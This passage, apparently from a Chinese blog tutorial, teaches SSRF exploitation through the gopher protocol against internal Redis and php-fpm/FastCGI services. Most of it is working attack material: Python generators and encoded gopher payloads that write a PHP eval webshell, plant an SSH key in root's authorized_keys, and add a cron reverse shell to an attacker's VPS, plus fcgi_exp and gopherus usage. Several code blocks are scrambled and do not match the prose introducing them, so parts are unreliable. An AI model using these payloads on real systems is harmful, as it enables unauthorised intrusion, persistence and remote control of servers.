   "config set dir {}".format(path),
   "config set dbfilename {}".format(filename),
   "save"
   ]
if passwd:
  cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
  CRLF="\r\n"
  redis_arr = arr.split(" ")
  cmd=""
  cmd+="*"+str(len(redis_arr))
  for x in redis_arr:
    cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
  cmd+=CRLF
  return cmd

if __name__=="__main__":
  for x in cmd:
    payload += urllib.quote(redis_format(x))
  print payload
```

**注意：上面那四个 HTTP 头是 POST 请求必须的，即 POST、Host、Content-Type 和 Content-Length。如果少了会报错的，而 GET 则不用。并且，特别要注意 Content-Length 应为字符串 “whoami=Bunny” 的长度。**

最后用脚本我们将上面的 POST 数据包进行 URL 编码并改为 gopher 协议

```
ssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252435%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2522whoami%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gG1gwcbYiaIyp4ylKJ19Q0Hr92jibo2fSfDbeW70FrlLImYzLtkk1wxEg/640?wx_fmt=png)

然后执行：

```
flushall
set 1 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami
'
config set dir /root/.ssh/
config set dbfilename authorized_keys
save
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gHMiczeXXFs0FiasjyeT0ZwsJibxCzumsiaN2ia1tP7ocAGawB49T4HYuicNw/640?wx_fmt=png)

如上图，成功用 POST 方法传参并输出 “Hello Bunny”。

**[2020 科来杯初赛]Web1** 这道题就是典型的运用 Gopher 发送 HTTP POST 请求进行 SSRF 攻击的思路。

### [2020 科来杯初赛]Web1

进入题目后即给处源码：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5g8PiaxQF1yZMiaUZ7qSCOLAkxudIfuYo6tCfx4alVib0VOpNqQ0RRfia2Tw/640?wx_fmt=png)

这里很明显就是一个 SSRF，url 过滤了 `file`、 `ftp`，但是必须要包含 `127.0.0.1`。并且，我们还发现一个 tool.php 页面，但是该页面进去之后仅显示一个 “Not localhost”，我们可以用这个 ssrf 将 tool.php 的源码读住来，构造反序列化 poc：

```
import urllib
protocol="gopher://"
ip="192.168.52.131"
port="6379"
ssh_pub="\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami\n\n"
file
path="/root/.ssh/"
passwd=""
cmd=["flushall",
   "set 1 {}".format(ssh_pub.replace(" ","${IFS}")),
   "config set dir {}".format(path),
   "config set dbfilename {}".format(filename),
   "save"
   ]
if passwd:
  cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
  CRLF="\r\n"
  redis_arr = arr.split(" ")
  cmd=""
  cmd+="*"+str(len(redis_arr))
  for x in redis_arr:
    cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
  cmd+=CRLF
  return cmd

if __name__=="__main__":
  for x in cmd:
    payload += urllib.quote(redis_format(x))
  print payload
```

生成：

```
ssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%2524568%250D%250A%250A%250Assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E%2F45IEs%2F9a6AWfXb6iwzo%252BD62y8MOmt%252Bsct27ZxGOcRR95FT6zrfFxqt2h56oLwml%2FTrxy5sExSQ%2FcvvLwUTWb3ntJYyh2eGkQnOf2d%252Bax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH%2F4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd%2FbWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ%2FNnHKyWtI%2FOzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe%252BXqQnjxtk4giopiFfRu8winE9scqlIA5Iu%2Fd3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg%2FOOhoA3iKNhJ%2FJT31TU9E24dGh2Ei8K%252BPpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl%252BSOsVHpNqwFcrgsq%2FWR5BGqnu54vTTdJh0pSrl%252BtniHEnWWU%253D%2520root%2540whoami%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252411%250D%250A%2Froot%2F.ssh%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252415%250D%250Aauthorized_keys%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A
```

将 Welcome 后面表示对象属性个数的 “1” 改为 “2” 即可绕过 `__destruct()`的限制。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gtlt9AALboNjWFwa1Ztibg6DD3tTIYrol8WDYMTElEZW5hZmhuucZ8lA/640?wx_fmt=png)

读出来 tool.php 的源码为：

```
set 1 '\n\n*/1 * * * * bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1\n\n'
config set dir /var/spool/cron/
config set dbfilename root
save

// 47.xxx.xxx.72为攻击者vps的IP
```

代码审计后可知 tool.php 页面存在命令执行漏洞。当 REMOTEADDR 为 127.0.0.1 时才可执行命令。REMOTEADDR 头获取的是客户端的真实的 IP，但是这个客户端是相对服务器而言的，也就是实际上与服务器相连的机器的 IP（建立 tcp 连接的那个），这个值是不可以伪造的，如果没有代理的话，这个值就是用户实际的 IP 值，有代理的话，用户的请求会经过代理再到服务器，这个时候 REMOTE_ADDR 会被设置为代理机器的 IP 值。而 X-Forwarded-For 的值是可以篡改的。

既然这里要求当 REMOTEADDR 为 127.0.0.1 时才可执行命令，且 REMOTEADDR 的值是不可以伪造的，我们要想让 REMOTE_ADDR 的值为 127.0.0.1，不可能通过修改 X-Forwarded-For 的值来实现，我们要利用 SSRF。

我们可以利用 index.php 页面的 SSRF 利用 gopher 协议发 POST 包请求 tool.php，进行命令执行。这样，整个攻击过程是在服务端进行的 REMOTE_ADDR 的值也就是 127.0.0.1 了。

SSRF，利用 gopher 发 POST 包，进行命令执行

```
import urllib
protocol="gopher://"
ip="192.168.52.131"
port="6379"
reverse_ip="47.xxx.xxx.72"
reverse_port="2333"
cron="\n\n\n\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1\n\n\n\n"%(reverse_ip,reverse_port)
file
path="/var/spool/cron"
passwd=""
cmd=["flushall",
   "set 1 {}".format(cron.replace(" ","${IFS}")),
   "config set dir {}".format(path),
   "config set dbfilename {}".format(filename),
   "save"
   ]
if passwd:
  cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
  CRLF="\r\n"
  redis_arr = arr.split(" ")
  cmd=""
  cmd+="*"+str(len(redis_arr))
  for x in redis_arr:
    cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
  cmd+=CRLF
  return cmd

if __name__=="__main__":
  for x in cmd:
    payload += urllib.quote(redis_format(x))
  print payload
```

这里因为我们是把 payload 发送到服务端让服务端执行，所以我们的 Host 和 gopher 里的 Host 为 127.0.0.1。

生成 gopher 协议格式的 payload 为：

```
go build fcgi_exp.go                    # 编译fcgi_exp.go
```

然后构造反序列化 exp：

```
./fcgi_exp system 127.0.0.1 2333 /var/www/html/index.php "id"
```

生成 payload：

```
# -*- coding: UTF-8 -*-
from urllib.parse import quote, unquote, urlencode

file = open('fcg_exp.txt','r')
payload = file.read()
print("gopher://127.0.0.1:9000/_"+quote(payload).replace("%0A","%0D").replace("%2F","/"))
```

同样将 Welcome 后面表示对象属性个数的 “1” 改为 “2” 绕过 `__destruct()`的限制后执行：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5ggAuJ60WgpQIrUjVcbkckEc2J4df9U0HTsFBlm2SMvqD87UmjUFBV4w/640?wx_fmt=png)

如上图，命令执行成功。

**注意：**这里要注意的是，我们发送的是 POST 包，而如果发送的是 GET 包的话，当这个 URL 经过服务器时，payload 部分会被自动 url 解码，%20 等字符又会被转码为空格。所以，curl_exec 在发起 gopher 时用的就是没有进行 URL 编码的值，就导致了现在的情况，所以我们要对 payload 进行二次 URL 编码。编码结果类似如下：

```
ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2514%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH56%250E%2504REQUEST_METHODPOST%2509%255BPHP_VALUEallow_url_include%2520%253D%2520On%250Ddisable_functions%2520%253D%2520%250Dsafe_mode%2520%253D%2520Off%250Dauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2500%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----0vcdb34oju09b8fd-----%250D%2527%2529%253B%253F%253E
```

攻击内网 Redis
----------

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5g7wg51JOsOOGPDz2JegUia2xMsMbeuNr4nQfjIKNgsY1JNyK1yvl0FFg/640?wx_fmt=png)

Redis 是数据库的意思。Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用 ANSI C 语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value 数据库，并提供多种语言的 API。

> **什么是 Redis 未授权访问？**
> 
> Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的 ssh 公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器。
> 
> 简单说，漏洞的产生条件有以下两点：
> 
> *   redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网。
>     
> *   没有设置密码认证（一般为空），可以免密码远程登录 redis 服务。
>     

在 SSRF 漏洞中，如果通过端口扫描等方法发现目标主机上开放 6379 端口，则目标主机上很有可能存在 Redis 服务。此时，如果目标主机上的 Redis 由于没有设置密码认证、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用 Gopher 协议远程操纵目标主机上的 Redis，可以利用 Redis 自身的提供的 config 命令像目标主机写 WebShell、写 SSH 公钥、创建计划任务反弹 Shell 等，其思路都是一样的，就是先将 Redis 的本地数据库存放目录设置为 web 目录、~/.ssh 目录或 / var/spool/cron 目录等，然后将 dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行 save 或 bgsave 保存，则我们就指定的目录里写入指定的文件了。

下面我们对攻击 Redis 的手法进行演示。测试环境如下，内网中其他主机均有外网 IP 并可以上网：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gzR88jgJsfHib2LStHWqNKDTsTFAQB5GB6ynFTOibhgnxvqhib6nJBW4Lg/640?wx_fmt=png)

在上文扫描内网端口的实验中，我们发现了内网中有一个 IP 为 192.168.52.131 的主机在 6379 端口上运行着一个 Redis 服务，下面我们就用它来演示，通过 Ubuntu 服务器上的 SSRF 漏洞去攻击内网主机（192.168.52.131）的 Redis。

### 绝对路径写 WebShell

首先构造 redis 命令:

```
python gopherus.py --exploit fastcgi
/var/www/html/index.php    # 这里输入的是一个已知存在的php文件
id    # 输入一个你要执行的命令
```

然后写一个脚本，将其转化为 Gopher 协议的格式（脚本时从网上嫖的，谁让我菜呢~~~ 大佬勿喷）：

```
ssrf.php?url=gopher%3A//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2517SCRIPT_FILENAME/var/www/html/index.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
```

执行后生成 payload 如下：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5g1uRibWibqh2abyl8DNSen3BaDwGYJiaUcgr0GQGSokdib0aw4SSf4RtHWA/640?wx_fmt=png)

这里将生成的 payload 要进行 url 二次编码（因为我们发送 payload 用的是 GET 方法），然后利用 Ubuntu 服务器上的 SSRF 漏洞，将二次编码后的 payload 打过去就行了：

```
python gopherus.py --exploit mysql
whoami    # 登录用的用户名
show databases;    # 登录后要执行的sql语句
```

如下所示，成功在主机 192.168.52.131 上面写入 WebShell：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gmsa5G9Z40jGFauqtCng0nEzW2BgnH1WEYqbibdiaicTEtHN0dP3uHM0icA/640?wx_fmt=png)

### 写入 SSH 公钥

同样，我们也可以直接这个存在 Redis 未授权的主机的~/.ssh 目录下写入 SSH 公钥，直接实现免密登录，但前提是~/.ssh 目录存在，如果不存在我们可以写入计划任务来创建该目录。

构造 redis 命令：

```
flushall
set 1 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami
'
config set dir /root/.ssh/
config set dbfilename authorized_keys
save
```

然后编写脚本，将其转化为 Gopher 协议的格式：

```
import urllib
protocol="gopher://"
ip="192.168.52.131"
port="6379"
ssh_pub="\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami\n\n"
file
path="/root/.ssh/"
passwd=""
cmd=["flushall",
   "set 1 {}".format(ssh_pub.replace(" ","${IFS}")),
   "config set dir {}".format(path),
   "config set dbfilename {}".format(filename),
   "save"
   ]
if passwd:
  cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
  CRLF="\r\n"
  redis_arr = arr.split(" ")
  cmd=""
  cmd+="*"+str(len(redis_arr))
  for x in redis_arr:
    cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
  cmd+=CRLF
  return cmd
if __name__=="__main__":
  for x in cmd:
    payload += urllib.quote(redis_format(x))
  print payload
```

生成的 payload 同样进行 url 二次编码，然后利用 Ubuntu 服务器上的 SSRF 打过去：  

```
ssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%2524568%250D%250A%250A%250Assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E%2F45IEs%2F9a6AWfXb6iwzo%252BD62y8MOmt%252Bsct27ZxGOcRR95FT6zrfFxqt2h56oLwml%2FTrxy5sExSQ%2FcvvLwUTWb3ntJYyh2eGkQnOf2d%252Bax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH%2F4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd%2FbWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ%2FNnHKyWtI%2FOzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe%252BXqQnjxtk4giopiFfRu8winE9scqlIA5Iu%2Fd3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg%2FOOhoA3iKNhJ%2FJT31TU9E24dGh2Ei8K%252BPpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl%252BSOsVHpNqwFcrgsq%2FWR5BGqnu54vTTdJh0pSrl%252BtniHEnWWU%253D%2520root%2540whoami%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252411%250D%250A%2Froot%2F.ssh%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252415%250D%250Aauthorized_keys%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A
```

如下图，成功在主机 192.168.52.131 上面写入 SSH 公钥：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5g2TPYwEaazN42Tkhj5rxsDFa9hM6AbcsnEHH2FfBm8XfnmNbfib6iaAnw/640?wx_fmt=png)

如下图，ssh 连接成功：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gtVQjLzJicosvhtxqVvibZ3QMfFAO9jHFawyOx96wibXZBJWVAk360f8OA/640?wx_fmt=png)

### 创建计划任务反弹 Shell

**注意：这个只能在 Centos 上使用，别的不行，好像是由于权限的问题。**

构造 redis 的命令如下：

```
set 1 '\n\n*/1 * * * * bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1\n\n'
config set dir /var/spool/cron/
config set dbfilename root
save
// 47.xxx.xxx.72为攻击者vps的IP
```

然后编写脚本，将其转化为 Gopher 协议的格式：

```
import urllib
protocol="gopher://"
ip="192.168.52.131"
port="6379"
reverse_ip="47.xxx.xxx.72"
reverse_port="2333"
cron="\n\n\n\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1\n\n\n\n"%(reverse_ip,reverse_port)
file
path="/var/spool/cron"
passwd=""
cmd=["flushall",
   "set 1 {}".format(cron.replace(" ","${IFS}")),
   "config set dir {}".format(path),
   "config set dbfilename {}".format(filename),
   "save"
   ]
if passwd:
  cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
  CRLF="\r\n"
  redis_arr = arr.split(" ")
  cmd=""
  cmd+="*"+str(len(redis_arr))
  for x in redis_arr:
    cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
  cmd+=CRLF
  return cmd
if __name__=="__main__":
  for x in cmd:
    payload += urllib.quote(redis_format(x))
  print payload
```

生成的 payload 同样进行 url 二次编码，然后利用 Ubuntu 服务器上的 SSRF 打过去，即可在目标主机 192.168.52.131 上写入计划任务，等到时间后，攻击者 vps 上就会获得目标主机的 shell：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gSicueJjEVkxmWDgSVwldvJNeRRpPnB3HUfmQAch94UMxX1gJ3v6JMIQ/640?wx_fmt=png)

[GKCTF2020]EZ 三剑客 - EzWeb 这道题利用的就是攻击内网 Redis 的思路。

攻击内网 FastCGI
------------

FastCGI 指快速通用网关接口（Fast Common Gateway Interface／FastCGI）是一种让交互程序与 Web 服务器通信的协议。FastCGI 是早期通用网关接口（CGI）的增强版本。FastCGI 致力于减少网页服务器与 CGI 程序之间交互的开销，从而使服务器可以同时处理更多的网页请求。

> 众所周知，在网站分类中存在一种分类就是静态网站和动态网站，两者的区别就是静态网站只需要**通过浏览器进行解析**，而动态网站需要一个**额外的编译解析**的过程。以 Apache 为例，当访问动态网站的主页时，根据容器的配置文件，它知道这个页面不是静态页面，Web 容器就会把这个请求进行简单的处理，然后如果使用的是 CGI，就会启动 CGI 程序（对应的就是 PHP 解释器）。接下来 PHP 解析器会解析 php.ini 文件，初始化执行环境，然后处理请求，再以规定 CGI 规定的格式返回处理后的结果，退出进程，Web server 再把结果返回给浏览器。这就是一个完整的动态 PHP Web 访问流程。
> 
> 这里说的是使用 CGI，而 FastCGI 就相当于高性能的 CGI，与 CGI 不同的是它**像一个常驻的 CGI**，在启动后会一直运行着，不需要每次处理数据时都启动一次，**所以 FastCGI 的主要行为是将 CGI 解释器进程保持在内存中**，并因此获得较高的性能 。

### php-fpm

FPM（FastCGI 进程管理器）可以说是 FastCGI 的一个具体实现，用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。

攻击 FastCGI 的主要原理就是，在设置环境变量实际请求中会出现一个 `SCRIPT_FILENAME': '/var/www/html/index.php` 这样的键值对，它的意思是 php-fpm 会执行这个文件，但是这样即使能够控制这个键值对的值，但也只能控制 php-fpm 去执行某个已经存在的文件，不能够实现一些恶意代码的执行。

而在 PHP 5.3.9 后来的版本中，PHP 增加了安全选项导致只能控制 php-fpm 执行一些 php、php4 这样的文件，这也增大了攻击的难度。但是好在 PHP 允许通过 PHPADMINVALUE 和 PHP_VALUE 去动态修改 PHP 的设置。

那么当设置 PHP 环境变量为：`auto_prepend_file=php://input;allow_url_include = On` 时，就会在执行 PHP 脚本之前包含环境变量 `auto_prepend_file` 所指向的文件内容， `php://input` 也就是接收 POST 的内容，这个我们可以在 FastCGI 协议的 body 控制为恶意代码，这样就在理论上实现了 php-fpm 任意代码执行的攻击。

详情请见：《SSRF 系列之攻击 FastCGI》

测试环境：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gJEsBYLUWxjFMwg8y64meB3aBQ0rlpib86Da0eZl6U0L1mLC6OBVMOZw/640?wx_fmt=png)

WEB 服务器 Ubuntu（192.168.43.166）存在 SSRF 漏洞：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gCChOVFNNBPPWD4EfAEnzumj1YPyYiamhJ9LtCHDm8actic9XE1fQ9ouw/640?wx_fmt=png)

并且 WEB 服务器 Ubuntu 上存在 FastCGI，那么我们就可以利用其 SSRF 漏洞去攻击其本地的 FastCGI。

> 假设在配置 fpm 时，将监听的地址设为了 0.0.0.0:9000，那么就会产生 php-fpm 未授权访问漏洞，此时攻击者可以无需利用 SSRF 从服务器本地访问的特性，直接与服务器 9000 端口上的 php-fpm 进行通信，进而可以用 fcgi_exp 等工具去攻击服务器上的 php-fpm 实现任意代码执行。
> 
> 当内网中的其他主机上配置有 fpm，且监听的地址为 0.0.0.0:9000 时，那么这台主机就可能存在 php-fpm 未授权访问漏洞，我们便可以利用 Ubuntu 服务器上的 SSRF 去攻击他，如果内网中的这台主机不存在 php-fpm 未授权访问漏洞，那么就直接利用 Ubuntu 服务器上的 SSRF 去攻击他显然是不行的。

### 使用 fcgi_exp 工具攻击

下载地址：https://github.com/piaca/fcgi_exp

这个工具主要是用来攻击未授权访问 php-fpm 的，可用来测试是否可以直接攻击 php-fpm，但需要自己将生成的 payload 进行转换一下。

该工具需要 go 语言环境，下载后进入目录执行如下命令进行编译：

```
go build fcgi_exp.go                    # 编译fcgi_exp.go
```

编译完成后，我们在攻击机上使用 `nc-lvvp2333>fcg_exp.txt` 监听 2333 端口来接收 fcgi_exp 生成的 payload，另外再开启一个终端使用下面的命令来向 2333 端口发送 payload：

```
./fcgi_exp system 127.0.0.1 2333 /var/www/html/index.php "id"
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8SgJ1jhUy7l4LlzhmLjv5gsAJY6b1hhr5jAibYhaNnDDB7smtrSpDgaQ1384XnLIV9Uod4P2eufFQ/640?wx_fmt=png)

生成的 fcg_exp.txt 文件的内容是接收到的 payload，内容如下：

